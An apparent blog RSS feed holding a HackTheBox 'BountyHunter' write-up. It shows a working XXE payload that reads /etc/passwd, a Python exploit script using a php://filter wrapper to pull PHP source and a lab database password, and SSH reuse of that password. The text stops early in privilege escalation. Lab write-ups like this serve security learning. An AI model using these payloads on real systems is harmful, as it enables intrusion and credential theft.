<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Linux on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/linux/</link>
    <description>Recent content in Linux on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 22 Nov 2021 21:31:31 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - BountyHunter</title>
      <link>https://fahmifj.github.io/hackthebox/bountyhunter/</link>
      <pubDate>Mon, 22 Nov 2021 21:31:31 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/bountyhunter/</guid>
      <description>BountyHunter features a website that is vulnerable to XXE attack. Exploiting it allows me to retrieve the user credentials from the source code. For the root part, there is an internal tool for ticket validation which can be exploited by leveraging the Python eval function to pops a root shell.
Skills Learned XXE attack Code injection Tools Nmap Burp Suite Reconnaissance Nmap A full tcp scan with nmap reveals two open ports: SSH and an Apache web server.</description>
      <content:encoded><![CDATA[<p>BountyHunter features a website that is vulnerable to XXE attack. Exploiting it allows me to retrieve the user credentials from the source code. For the root part, there is an internal tool for ticket validation which can be exploited by leveraging the Python eval function to pops a root shell.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>XXE attack</li>
<li>Code injection</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full tcp scan with <code>nmap</code> reveals two open ports: SSH and an Apache web server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «bountyhunter» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> -oA nmap/10-tcp-allport-bounty 10.10.11.100
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-29 12:49 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.100
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.060s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed ports
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp open  ssh
</span></span><span class="line"><span class="cl">80/tcp open  http
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 48.51 seconds
</span></span><span class="line"><span class="cl">→ kali@kali «bountyhunter» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -p22,80 --min-rate <span class="m">1000</span> -oA nmap/10-tcp-allport-script-bounty 10.10.11.100
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-29 12:52 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.100
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.055s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Bounty Hunters
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 9.30 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 shows a portfolio website that is similar with one of the HTB web challenges: <a href="https://app.hackthebox.com/challenges/freelancer">Freelancer</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210730203525289.png" alt="image-20210730203525289"  title="Websites view"  /></div>
</p>
<p>Clicking on portal redirects to <code>/portal.php</code>, and the page is under development.</p>
<p><div class="img-container"><img src="imgs/image-20210730204150975.png" alt="image-20210730204150975"  /></div>
</p>
<p>Clicking the &lsquo;here&rsquo; text points to <code>/log_submit.php</code>. There is a form there and I can submit some inputs.</p>
<p><div class="img-container"><img src="imgs/image-20210730205749566.png" alt="image-20210730205749566"  /></div>
</p>
<p>By observing the traffic, I can see that the form data is submitted to <code>trackerdiRbpr00f314.php</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210730204826225.png" alt="image-20210730204826225"  /></div>
</p>
<p>It seems the submitted data is converted to an xml document and encoded in base64</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «bountyhunter» «10.10.14.29» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5kZG9zPC90aXRsZT4KCQk8Y3dlPmN3ZS01MDA8L2N3ZT4KCQk8Y3Zzcz4xMDwvY3Zzcz4KCQk8cmV3YXJkPjEkPC9yZXdhcmQ+CgkJPC9idWdyZXBvcnQ+&#39;</span> <span class="p">|</span> base64 -d
</span></span><span class="line"><span class="cl">&lt;?xml  <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&#34;ISO-8859-1&#34;</span>?&gt;
</span></span><span class="line"><span class="cl">                &lt;bugreport&gt;
</span></span><span class="line"><span class="cl">                &lt;title&gt;ddos&lt;/title&gt;
</span></span><span class="line"><span class="cl">                &lt;cwe&gt;cwe-500&lt;/cwe&gt;
</span></span><span class="line"><span class="cl">                &lt;cvss&gt;10&lt;/cvss&gt;
</span></span><span class="line"><span class="cl">                &lt;reward&gt;1$&lt;/reward&gt;
</span></span><span class="line"><span class="cl">                &lt;/bugreport&gt;
</span></span></code></pre></div><p>Further observation reveals a web directory which has directory listing enabled.</p>
<p><div class="img-container"><img src="imgs/image-20210730204030384.png" alt="image-20210730204030384"  /></div>
</p>
<p>The contents of <code>readme.txt</code> contains some to do list.</p>
<p><div class="img-container"><img src="imgs/image-20210730203939994.png" alt="image-20210730203939994"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="xxe">XXE</h3>
<h4 id="poc">PoC</h4>
<p>Seeing XML document submitted in base64 encoded leads to an assumption of XXE attack. I will use the following payload to test the attack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.29» 
</span></span><span class="line"><span class="cl">$ cat xxe1.test 
</span></span><span class="line"><span class="cl">&lt;?xml  <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&#34;ISO-8859-1&#34;</span>?&gt;
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE bugreport <span class="o">[</span>&lt;!ENTITY passwd SYSTEM <span class="s2">&#34;file:///etc/passwd&#34;</span> &gt;<span class="o">]</span> &gt;
</span></span><span class="line"><span class="cl">&lt;bugreport&gt;
</span></span><span class="line"><span class="cl"> &lt;title&gt;<span class="p">&amp;</span>passwd<span class="p">;</span>&lt;/title&gt;
</span></span><span class="line"><span class="cl"> &lt;cwe&gt;cwe-500&lt;/cwe&gt;
</span></span><span class="line"><span class="cl"> &lt;cvss&gt;10&lt;/cvss&gt;
</span></span><span class="line"><span class="cl"> &lt;reward&gt;1$&lt;/reward&gt;
</span></span><span class="line"><span class="cl">&lt;/bugreport&gt;
</span></span><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.29» 
</span></span><span class="line"><span class="cl">$ cat xxe1.test <span class="p">|</span> base64 -w <span class="m">0</span>   
</span></span><span class="line"><span class="cl">PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGJ1Z3JlcG9ydCBbPCFFTlRJVFkgcGFzc3dkIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIiA+XSA+CjxidWdyZXBvcnQ+CiA8dGl0bGU+JnBhc3N3ZDs8L3RpdGxlPgogPGN3ZT5jd2UtNTAwPC9jd2U+CiA8Y3Zzcz4xMDwvY3Zzcz4KIDxyZXdhcmQ+MSQ8L3Jld2FyZD4KPC9idWdyZXBvcnQ+Cg<span class="o">==</span>
</span></span></code></pre></div><p>I will intercept the submit request and put my payload there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/tracker_diRbPr00f314.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">10.10.11.100</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded; charset=UTF-8</span>
</span></span><span class="line"><span class="cl"><span class="n">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">323</span>
</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://10.10.11.100</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://10.10.11.100/log_submit.php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGJ1Z3JlcG9ydCBbPCFFTlRJVFkgcGFzc3dkIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIiA%2bXSA%2bCjxidWdyZXBvcnQ%2bCiA8dGl0bGU%2bJnBhc3N3ZDs8L3RpdGxlPgogPGN3ZT5jd2UtNTAwPC9jd2U%2bCiA8Y3Zzcz4xMDwvY3Zzcz4KIDxyZXdhcmQ%2bMSQ8L3Jld2FyZD4KPC9idWdyZXBvcnQ%2bCg%3d%3d
</span></span></code></pre></div><p>When I submit, it returns with:</p>
<p><div class="img-container"><img src="imgs/image-20210730205835371.png" alt="image-20210730205835371"  /></div>
</p>
<p>It was vulnerable!</p>
<h3 id="shell-as-development">Shell as Development</h3>
<h4 id="file-read">File Read</h4>
<p>I created a Python script to exploit the XXE and grab the file contents.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">file_to_read</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Usage: </span><span class="si">%s</span><span class="s1"> &lt;file-to-read&gt;&#39;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">target_url</span> <span class="o">=</span> <span class="s2">&#34;http://10.10.11.100/tracker_diRbPr00f314.php&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;http&#34;</span><span class="p">:</span> <span class="s2">&#34;http://127.0.0.1:8080&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
</span></span><span class="line"><span class="cl"><span class="n">xxe_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;!DOCTYPE bugreport [&lt;!ENTITY xxe SYSTEM &#34;file://</span><span class="si">{</span><span class="n">file_to_read</span><span class="si">}</span><span class="s2">&#34; &gt;]
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;bugreport&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2"> &lt;title&gt;&amp;xxe;&lt;/title&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2"> &lt;cwe&gt;cwe-500&lt;/cwe&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2"> &lt;cvss&gt;10&lt;/cvss&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2"> &lt;reward&gt;1$&lt;/reward&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/bugreport&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">xxe_payload_b64</span> <span class="o">=</span>  <span class="n">b64encode</span><span class="p">(</span><span class="n">xxe_payload</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#print(f&#34;[+] Crafted payload \n{xxe_payload_b64}&#34;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="n">xxe_payload_b64</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">xxe_resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="s2">&#34;cwe-500&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">xxe_resp</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Something went wrong&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
</span></span><span class="line"><span class="cl"><span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">xxe_resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="s2">&#34;lxml&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="p">[</span><span class="n">tag</span><span class="o">.</span><span class="n">text</span> <span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s2">&#34;td&#34;</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span></code></pre></div><p>But when I try to use this script to read PHP files, it fails</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.29» 
</span></span><span class="line"><span class="cl">$ python3 bountyhunters_xxe.py /var/www/html/index.php           
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Something went wrong
</span></span></code></pre></div><p>This time I modified the script and used the PHP wrapper.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">...</span><span class="p">[</span><span class="n">SNIP</span><span class="p">]</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span> <span class="n">bugreport</span> <span class="p">[</span><span class="o">&lt;</span><span class="err">!</span><span class="n">ENTITY</span> <span class="n">xxe</span> <span class="n">SYSTEM</span> <span class="s2">&#34;php://filter/convert.base64-encode/resource=</span><span class="si">{file_to_read}</span><span class="s2">&#34;</span> <span class="o">&gt;</span><span class="p">]</span> <span class="o">&gt;</span> 
</span></span><span class="line"><span class="cl"><span class="o">...</span><span class="p">[</span><span class="n">SNIP</span><span class="p">]</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
</span></span><span class="line"><span class="cl"><span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">xxe_resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="s2">&#34;lxml&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="p">[</span><span class="n">tag</span><span class="o">.</span><span class="n">text</span> <span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s2">&#34;td&#34;</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">b64decode</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">))</span>
</span></span></code></pre></div><p>And it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.29» 
</span></span><span class="line"><span class="cl">$ python3 bountyhunters_xxe_filter.py /var/www/html/tracker_diRbPr00f314.php
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;data&#39;</span><span class="o">]))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl"><span class="nv">$xml</span> <span class="o">=</span> base64_decode<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;data&#39;</span><span class="o">])</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">libxml_disable_entity_loader<span class="o">(</span><span class="nb">false</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dom</span> <span class="o">=</span> new DOMDocument<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dom</span>-&gt;loadXML<span class="o">(</span><span class="nv">$xml</span>, LIBXML_NOENT <span class="p">|</span> LIBXML_DTDLOAD<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$bugreport</span> <span class="o">=</span> simplexml_import_dom<span class="o">(</span><span class="nv">$dom</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">?&gt;
</span></span><span class="line"><span class="cl">If DB were ready, would have added:
</span></span><span class="line"><span class="cl">&lt;table&gt;
</span></span><span class="line"><span class="cl">  &lt;tr&gt;
</span></span><span class="line"><span class="cl">    &lt;td&gt;Title:&lt;/td&gt;
</span></span><span class="line"><span class="cl">    &lt;td&gt;&lt;?php <span class="nb">echo</span> <span class="nv">$bugreport</span>-&gt;title<span class="p">;</span> ?&gt;&lt;/td&gt;
</span></span><span class="line"><span class="cl">  &lt;/tr&gt;
</span></span><span class="line"><span class="cl">  &lt;tr&gt;
</span></span><span class="line"><span class="cl">    &lt;td&gt;CWE:&lt;/td&gt;
</span></span><span class="line"><span class="cl">    &lt;td&gt;&lt;?php <span class="nb">echo</span> <span class="nv">$bugreport</span>-&gt;cwe<span class="p">;</span> ?&gt;&lt;/td&gt;
</span></span><span class="line"><span class="cl">  &lt;/tr&gt;
</span></span><span class="line"><span class="cl">  &lt;tr&gt;
</span></span><span class="line"><span class="cl">    &lt;td&gt;Score:&lt;/td&gt;
</span></span><span class="line"><span class="cl">    &lt;td&gt;&lt;?php <span class="nb">echo</span> <span class="nv">$bugreport</span>-&gt;cvss<span class="p">;</span> ?&gt;&lt;/td&gt;
</span></span><span class="line"><span class="cl">  &lt;/tr&gt;
</span></span><span class="line"><span class="cl">  &lt;tr&gt;
</span></span><span class="line"><span class="cl">    &lt;td&gt;Reward:&lt;/td&gt;
</span></span><span class="line"><span class="cl">    &lt;td&gt;&lt;?php <span class="nb">echo</span> <span class="nv">$bugreport</span>-&gt;reward<span class="p">;</span> ?&gt;&lt;/td&gt;
</span></span><span class="line"><span class="cl">  &lt;/tr&gt;
</span></span><span class="line"><span class="cl">&lt;/table&gt;
</span></span></code></pre></div><p>There is a database connection file (<code>/var/www/html/db.php</code>) that contains DB credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.29» 
</span></span><span class="line"><span class="cl">$ python3 bountyhunters_xxe_filter.py /var/www/html/db.php   
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">// TODO -&gt; Implement login system with the database.
</span></span><span class="line"><span class="cl"><span class="nv">$dbserver</span> <span class="o">=</span> <span class="s2">&#34;localhost&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">&#34;bounty&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dbusername</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dbpassword</span> <span class="o">=</span> <span class="s2">&#34;m19RoAU0hP41A1sTsq6K&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$testuser</span> <span class="o">=</span> <span class="s2">&#34;test&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">?&gt;
</span></span></code></pre></div><h4 id="ssh">SSH</h4>
<p>The database password works on user <code>development</code> (from <code>/etc/passwd</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> kali@kali «exploits» «10.10.14.29» 
</span></span><span class="line"><span class="cl">$ ssh development@10.10.11.100
</span></span><span class="line"><span class="cl">development@10.10.11.100<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.2 LTS <span class="o">(</span>GNU/Linux 5.4.0-80-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System information as of Fri <span class="m">30</span> Jul <span class="m">2021</span> 03:28:24 PM UTC
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:           0.0
</span></span><span class="line"><span class="cl">  Usage of /:            38.4% of 6.83GB
</span></span><span class="line"><span class="cl">  Memory usage:          30%
</span></span><span class="line"><span class="cl">  Swap usage:            0%
</span></span><span class="line"><span class="cl">  Processes:             <span class="m">214</span>
</span></span><span class="line"><span class="cl">  Users logged in:       <span class="m">1</span>
</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> eth0: 10.10.11.100
</span></span><span class="line"><span class="cl">  IPv6 address <span class="k">for</span> eth0: dead:beef::250:56ff:feb9:cb7f
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Fri Jul <span class="m">30</span> 13:44:59 <span class="m">2021</span> from 10.10.14.42
</span></span><span class="line"><span class="cl">development@bountyhunter:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>development<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>development<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>development<span class="o">)</span>
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>At current home directory, there are some plain text files.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">development@bountyhunter:~$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">12</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root        root        <span class="m">471</span> Jun <span class="m">15</span> 16:10 contract.txt
</span></span><span class="line"><span class="cl">-r--r----- <span class="m">1</span> root        development  <span class="m">33</span> Jul <span class="m">30</span> 05:20 user.txt
</span></span></code></pre></div><p>The content of <code>contract.txt</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">development@bountyhunter:~$ cat contract.txt 
</span></span><span class="line"><span class="cl">Hey team,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">I<span class="s1">&#39;ll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">This has been our first job since the &#34;rm -rf&#34; incident and we can&#39;</span>t mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">I <span class="nb">set</span> up the permissions <span class="k">for</span> you to <span class="nb">test</span> this. Good luck.
</span></span><span class="line"><span class="cl">
